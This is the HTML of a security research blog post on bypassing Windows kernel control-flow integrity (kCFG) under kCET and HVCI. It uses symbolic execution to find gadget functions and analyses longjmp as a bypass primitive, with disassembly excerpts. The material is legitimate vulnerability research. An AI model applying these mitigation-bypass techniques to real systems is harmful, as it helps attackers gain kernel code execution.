<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title> Code reuse in the age of kCET and HVCI - Slowerzs&#39; blog </title>
    <meta name="HandheldFriendly" content="True">
    <meta name="MobileOptimized" content="320">
    <meta name="referrer" content="no-referrer">
    <meta name="description" content="" />
    <meta property="og:site_name" content="Slowerzs&#39; blog" />
    <meta property="og:locale" content="en_US" />
    <meta property="og:type" content="article" />
    <meta property="og:url" content="https://blog.slowerzs.net/posts/keyjumper/" />
    <meta property="og:title" content="Code reuse in the age of kCET and HVCI" />
    <meta property="og:image" content="https://blog.slowerzs.net/images/small-favicon.png" />
    <meta property="og:description" content="" />

    <meta name="twitter:card" content=" summary_large_image" />
    
    <meta name="twitter:title" content="Code reuse in the age of kCET and HVCI" />
    <meta name="twitter:description" content="" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="@slowerzs">
    <meta name="twitter:image" content="https://blog.slowerzs.net/images/small-favicon.png" />

    <link rel="canonical" href="https://blog.slowerzs.net/posts/keyjumper/">

    <link rel="stylesheet" href="https://blog.slowerzs.net/css/bootstrap.min.css" />

    <link rel="stylesheet" href="https://blog.slowerzs.net/css/custom.css" />
    <link rel="stylesheet" href="https://blog.slowerzs.net/css/syntax.css" />

    

    <link rel="shortcut icon"
        href="https://blog.slowerzs.net/images/favicon.png?">

</head>

<body>
    <script>

        window.addEventListener('load', function () {
            hljs.configure({
                ignoreUnescapedHTML: true
            })
            hljs.highlightAll();
        }, true);

        let darkTheme = localStorage.getItem("darkTheme")
        if (darkTheme === null) {
            if (window.matchMedia("(prefers-color-scheme: dark)").matches) {
                document.documentElement.setAttribute('data-theme', 'dark');
                localStorage.setItem("darkTheme", true);
                document.getElementById("light-css").setAttribute('disabled', 'true')
                document.getElementById("dark-css").removeAttribute('disabled')
            } else {
                document.documentElement.setAttribute('data-theme', 'light');
                localStorage.setItem("darkTheme", false);
                document.getElementById("dark-css").setAttribute('disabled', 'true')
                document.getElementById("light-css").removeAttribute('disabled')
            }
        } else if (darkTheme === "true") {
            document.documentElement.setAttribute('data-theme', 'dark');
            document.getElementById("light-css").setAttribute('disabled', 'true')
            document.getElementById("dark-css").removeAttribute('disabled')
        } else {
            document.documentElement.setAttribute('data-theme', 'light');
            document.getElementById("dark-css").setAttribute('disabled', 'true')
            document.getElementById("light-css").removeAttribute('disabled')
        }

        function switchTheme() {
            let darkTheme = localStorage.getItem("darkTheme");
            if (darkTheme === null) {
                darkTheme = window.matchMedia("(prefers-color-scheme: dark)").matches.toString()
            }

            if (darkTheme === "true") {
                document.documentElement.setAttribute('data-theme', 'light');
                localStorage.setItem("darkTheme", false);
                document.getElementById("dark-css").setAttribute('disabled', 'true')
                document.getElementById("light-css").removeAttribute('disabled')
            } else {
                document.documentElement.setAttribute('data-theme', 'dark');
                localStorage.setItem("darkTheme", true);
                document.getElementById("light-css").setAttribute('disabled', 'true')
                document.getElementById("dark-css").removeAttribute('disabled')
            }

        }
    </script>
    
    <div class="mt-xl header">
    <div class="container">
        <div>
            <div class="row justify-content-center">
                <div class="row">
                    <a href="https://blog.slowerzs.net/">
                        <h1 class="name">Slowerzs&#39; blog</h1>
                    </a>
                    <img id="switcher" onclick="switchTheme()" src="https://blog.slowerzs.net/images/theme-dark.svg" height="32px" width="32px"
                        style="position: absolute; left: 93%; transform: translateX(-93%);" />
                </div>
            </div>

            <div class="row justify-content-center">
                <ul class="nav nav-primary">
                    
                    <li class="nav-item">
                        <a class="nav-link" href="https://blog.slowerzs.net/">
                            
                            Home
                        </a>
                    </li>
                    
                    <li class="nav-item">
                        <a class="nav-link" href="https://github.com/Slowerzs">
                            
                            Github
                        </a>
                    </li>
                    
                    <li class="nav-item">
                        <a class="nav-link" href="https://twitter.com/slowerzs">
                            
                            Twitter
                        </a>
                    </li>
                    
                    <li class="nav-item">
                        <a class="nav-link" href="https://blog.slowerzs.net/archive">
                            
                            Archive
                        </a>
                    </li>
                    
                </ul>
            </div>

        </div>
    </div>
</div>

    <div class="content">
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-sm-12 col-lg-8">
                    <h1 class="mx-0 mx-md-4">Code reuse in the age of kCET and HVCI</h1>
                    <h6 class="mx-md-4 post-date">March 19, 2025</h6>
                </br>
                    <div class="markdown">
                        
    <p>With the recent evolutions of the Windows kernel, multiple mitigations and hardenings have been created, to prevent arbitrary kernel code execution. First, HVCI ensures at the hypervisor level that only signed drivers can be loaded within the kernel. To prevent the allocation of new executable pages, <em>Extended Page Tables</em> are used - new executable pages can only be allocated with support of the hypervisor, and that requires some form of code signature.</p>
<p>Then, to ensure already loaded code cannot be reused, Control-Flow Integrity is enforced using two different mechanisms. kCFG is a software implementation of CFI used to protect forward edges, which relies on a bitmap of valid call targets - bitmap that is protected by the hypervisor.
Backward-edges are protected using kCET, Windows support of Intel CET, a hardware implementation of a shadow stack, which protects return addresses on the stack from tampering.</p>
<p>All of these mechanisms are described in <a href="https://connormcgarr.github.io/hvci/">this blogpost</a>, which I recommend reading.</p>
<p>The addition of kCET makes techniques such as <a href="https://github.com/Cr4sh/KernelForge">KernelForge</a> non-functionnal, which would craft a ROP chain on the stack of a dummy thread to chain arbitrary function calls.</p>
<p>In this blogpost, I wanted to explore whether kernel-code execution was still possible, or if data-only attacks are now the only way to go.</p>
<h2 id="breaking-forward-edge-integrity">Breaking forward-edge integrity</h2>
<p>While kCET seems pretty robust, kCFG is not as robust as Intel IBT, the hardware implementation of forward-edge CFI. As such, techniques like <em>Jump-Oriented Programming</em> (JOP) can get around kCET, but the first gadget in the chain is unlikely to be a valid call target. Therefore, we need to get around kCFG once, afterwards, it is no longer a concern during the execution of the JOP chain.</p>
<p>kCFG can only maintain the integrity of the control flow if every call site is instrumented. In practice however, in the Windows kernel, it is not uncommon to find unprotected calls or jumps.</p>
<p>To discover interesting functions which lead to unprotected call sites with attacker controlled data, I experimented with two different approaches: manually inspecting control-flow related functions, in particular functions that can modify the control-flow in unpredictable ways at compile time - exceptions and <code>goto</code>. The second approach was using symbolic execution with the <a href="https://github.com/cea-sec/miasm">miasm</a> framework.</p>
<h3 id="symbolic-execution">Symbolic execution</h3>
<p>I wrote a quick script to list all valid call targets of <code>ntoskrnl.exe</code>, and for each function, ran the symbolic execution. Then, the execution stops when the instruction pointer cannot be solved, and logged the expression which determines the value of the instruction pointer.
I filtered the results to only keep functions where the instruction pointer depended on the arguments given to the function.</p>
<p>This yielded some interesting results. Below I show some candidates that could be used, depending on the primitive you have:</p>
<p><code>KiDpcDispatch</code> xors a buffer pointed by <code>RCX</code> with <code>RDX</code>, then gets the address of a kernel function, writes a value to the target address, and jumps to it. For example, the expression returned by miasm is the following: <code>(@64[@64[RCX + 0x40] + 0x20] ^ @64[@64[RCX + 0x40] + 0x40]) | 0xFFFF800000000000</code>.</p>
<details>
    <summary>KiDpcDispatch</summary>
    <div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">add</span>        <span class="nb">rcx</span><span class="p">,</span> <span class="mh">0x48</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x88</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x98</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0xa0</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0xb0</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0xb8</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0xc0</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span><span class="p">],</span> <span class="nb">edx</span>
</span></span><span class="line"><span class="cl"><span class="nf">sub</span>        <span class="nb">rcx</span><span class="p">,</span> <span class="mh">0x48</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>        <span class="nv">r8</span><span class="p">,</span> <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>        <span class="nv">r10</span><span class="p">,</span> <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">r8</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>        <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0xffff800000000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>        <span class="nv">r9</span><span class="p">,</span> <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">r8</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="nv">r10</span><span class="p">,</span> <span class="nv">r9</span>
</span></span><span class="line"><span class="cl"><span class="nf">or</span>         <span class="nv">r10</span><span class="p">,</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>        <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0x85131481131482e</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>        <span class="nb">rcx</span><span class="p">,</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="nb">rdx</span><span class="p">,</span> <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">r10</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>        <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">r10</span><span class="p">],</span> <span class="nb">ecx</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>        <span class="nb">rcx</span><span class="p">,</span> <span class="nv">r10</span>
</span></span><span class="line"><span class="cl"><span class="nf">jmp</span>        <span class="nb">rcx</span>
</span></span></code></pre></div></div>
</details>

<p><code>RtlLookupFunctionEntryEx</code> calls the value <code>RCX + *(RCX-0x1000+0x7E8)</code> :</p>
<details>
    <summary>RtlLookupFunctionEntryEx</summary>
    <div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="nb">cs</span><span class="p">:[</span><span class="nb">rcx</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">xor</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">],</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">lea</span>        <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">-</span> <span class="mh">0x1000</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>        <span class="nb">eax</span><span class="p">,</span> <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rdx</span> <span class="o">+</span> <span class="mh">0x7e8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">add</span>        <span class="nb">rax</span><span class="p">,</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">sub</span>        <span class="nb">rsp</span><span class="p">,</span> <span class="mh">0x28</span>
</span></span><span class="line"><span class="cl"><span class="nf">call</span>       <span class="nb">rax</span>
</span></span><span class="line"><span class="cl"><span class="nf">add</span>        <span class="nb">rsp</span><span class="p">,</span> <span class="mh">0x28</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>        <span class="nv">r8</span><span class="p">,</span> <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rax</span> <span class="o">+</span> <span class="mh">0x110</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">lea</span>        <span class="nb">rcx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rax</span> <span class="o">+</span> <span class="mh">0x798</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>        <span class="nb">edx</span><span class="p">,</span> <span class="mh">0x1</span>
</span></span><span class="line"><span class="cl"><span class="nf">jmp</span>        <span class="nv">r8</span>
</span></span></code></pre></div></div>
</details>

<p><code>RtlpExecuteHandlerForException</code> simply calls the 6th argument:</p>
<details>
    <summary>RtlpExecuteHandlerForException</summary>
    <div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">sub</span>        <span class="nb">rsp</span><span class="p">,</span> <span class="mh">0x28</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>        <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">],</span> <span class="nv">r9</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span>        <span class="nb">rax</span><span class="p">,</span> <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">r9</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">call</span>       <span class="nb">rax</span>
</span></span><span class="line"><span class="cl"><span class="nf">nop</span>        <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">rax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">nop</span>
</span></span><span class="line"><span class="cl"><span class="nf">add</span>        <span class="nb">rsp</span> <span class="p">,</span><span class="mh">0x28</span>
</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
</span></span></code></pre></div></div>
</details>

<p>Despite having very different names, <code>KiDpcDispatch</code>, and <code>RtlLookupFunctionEntryEx</code> have something in common: they are all Patchguard functions with intentionally confusing names! :)</p>
<p><code>KiDpcDispatch</code> is not suitable for our needs, since it requires RWX memory (in the last 3 instructions).</p>
<p><code>RtlLookupFunctionEntryEx</code> could work, but would require carefully calculating the value in the 1st argument, so that the write operation ends up writing to writeable memory.</p>
<p>Finally <code>RtlpExecuteHandlerForException</code> redirects the control flow to the 6th parameter, with a <code>call</code> instruction. This can also work, depending on the primitive you have.</p>
<p>Overall, I think symbolic execution has a lot of potential to identify interesting functions to get around kCFG, even without much knowledge on the topic, I was quickly able to find valid candidates.
My implementation was also very limited, if the function had an immediate call, the symbolic execution would stop and not recursively execute the function called - and I still had multiple candidates.</p>
<h3 id="longjmp">longjmp</h3>
<p>While manually searching for interesting functions, I decided to look at the implementation of <code>longjmp</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">longjmp</span><span class="p">(</span><span class="n">jmp_buf</span> <span class="n">env</span><span class="p">,</span> <span class="kt">int</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">KeCheckStackAndTargetAddress</span><span class="p">(</span><span class="n">env</span><span class="o">-&gt;</span><span class="n">Rip</span><span class="p">,</span> <span class="n">env</span><span class="o">-&gt;</span><span class="n">Rsp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">__longjmp_internal</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The <code>__longjmp_internal</code> function performs the actual <em>longjmp</em> - it restores nonvolatile registers from the <code>env</code> parameter and jumps to the <code>Rip</code> value, without any CFG check:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">...</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rdx</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nv">r12</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nv">r13</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nv">r14</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nv">r15</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">ldmxcsr</span> <span class="kt">dword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">movdqa</span> <span class="nv">xmm6</span><span class="p">,</span> <span class="nv">xmmword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">movdqa</span> <span class="nv">xmm7</span><span class="p">,</span> <span class="nv">xmmword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">movdqa</span> <span class="nv">xmm8</span><span class="p">,</span> <span class="nv">xmmword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">movdqa</span> <span class="nv">xmm9</span><span class="p">,</span> <span class="nv">xmmword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x90</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">movdqa</span> <span class="nv">xmm10</span><span class="p">,</span> <span class="nv">xmmword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0xa0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">movdqa</span> <span class="nv">xmm11</span><span class="p">,</span> <span class="nv">xmmword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0xb0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">movdqa</span> <span class="nv">xmm12</span><span class="p">,</span> <span class="nv">xmmword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0xc0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">movdqa</span> <span class="nv">xmm13</span><span class="p">,</span> <span class="nv">xmmword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0xd0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">movdqa</span> <span class="nv">xmm14</span><span class="p">,</span> <span class="nv">xmmword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0xe0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">movdqa</span> <span class="nv">xmm15</span><span class="p">,</span> <span class="nv">xmmword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0xf0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rbp</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rsp</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rcx</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="nb">rdx</span>
</span></span></code></pre></div><p>This would be an ideal function to call to bypass the requirements of kCFG, but <code>__longjmp_internal</code> is not a valid call target. However, <code>longjmp</code> is a valid call target, so let&rsquo;s review  <code>KeCheckStackAndTargetAddress</code> to see what constraints we have:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">KeCheckStackAndTargetAddress</span><span class="p">(</span><span class="kt">size_t</span> <span class="n">Rip</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">Rsp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">StackLimit</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">StackBase</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">Rip</span> <span class="o">&gt;=</span> <span class="mh">0x8000000000000000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span> <span class="n">success</span> <span class="o">=</span> <span class="nf">KeQueryCurrentStackInformationEx</span><span class="p">(</span><span class="n">Rsp</span><span class="p">,</span> <span class="n">unused</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">StackBase</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">StackLimit</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(((</span><span class="n">success</span> <span class="o">!=</span> <span class="n">FALSE</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">StackBase</span> <span class="o">&lt;=</span> <span class="n">Rsp</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">Rsp</span> <span class="o">&lt;</span> <span class="n">StackLimit</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">__debugbreak</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Regarding the new <code>RIP</code> value, the only constraint is that it is a kernel address, so no real issue here. The new <code>RSP</code> value has a constraint: it must be within the bounds of the kernel stack of the current thread.</p>
<p>Starting with version <code>24H2</code>, new <a href="https://windows-internals.com/kaslr-leaks-restriction/">restrictions</a> on KASLR leaks are in place, which would prevent unprivileged users from getting an easy kernel stack address leak. While this can be an issue for exploiting a privilege escalation vulnerability, this isn&rsquo;t a problem when targeting &ldquo;admin-to-kernel&rdquo; scenarios.</p>
